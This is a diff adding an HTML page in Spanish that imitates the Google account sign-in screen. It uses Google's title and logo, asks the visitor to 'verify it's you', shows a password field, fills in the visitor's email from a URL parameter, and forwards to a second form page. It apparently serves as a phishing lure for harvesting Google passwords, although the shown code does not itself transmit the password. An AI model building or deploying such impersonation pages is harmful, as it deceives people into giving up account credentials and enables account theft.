@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" href="logogoogle.png" type="image/png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- agregado -->
+  <title>Iniciar sesión: Cuentas de Google</title>
+  <link rel="stylesheet" href="stylesGoogle.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <img src="logogoogle.png" alt="Google">
+    <span>Iniciar sesión con Google</span>
+  </div>
+  <div class="card">
+    <div class="left-side">
+      <div class="title">Inicia sesión</div>
+      <div class="email-display">
+        <span class="email-chip"></span>
+      </div>
+    </div>
+
+    <div class="right-side">
+      <form>
+        <div class="verificar">
+          <span>Debes verificar que eres tú para poder continuar</span>
+        </div>
+
+        <div class="input-group">
+          <input type="password" id="password" placeholder=" " required>
+          <label for="password">Introduce tu contraseña</label>
+        </div>
+
+        <div class="show-password">
+          <input type="checkbox" id="showPass">
+          <label for="showPass">Mostrar contraseña</label>
+        </div>
+
+        <div class="actions">
+          <a class="create" href="#">¿Has olvidado tu contraseña?</a>
+          <button class="next-btn" type="button" onclick="window.location.href='formulario.html'">Siguiente</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+<footer class="footer">
+  <div class="footer-left">
+    <span>Español (España)</span>
+  </div>
+  <div class="footer-right">
+    <a href="#">Ayuda</a>
+    <a href="#">Privacidad</a>
+    <a href="#">Términos</a>
+  </div>
+</footer>
+
+</body>
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get('email');
+  if (email) {
+    document.querySelector('.email-chip').textContent = email;
+  }
+</script>
+
+</html>
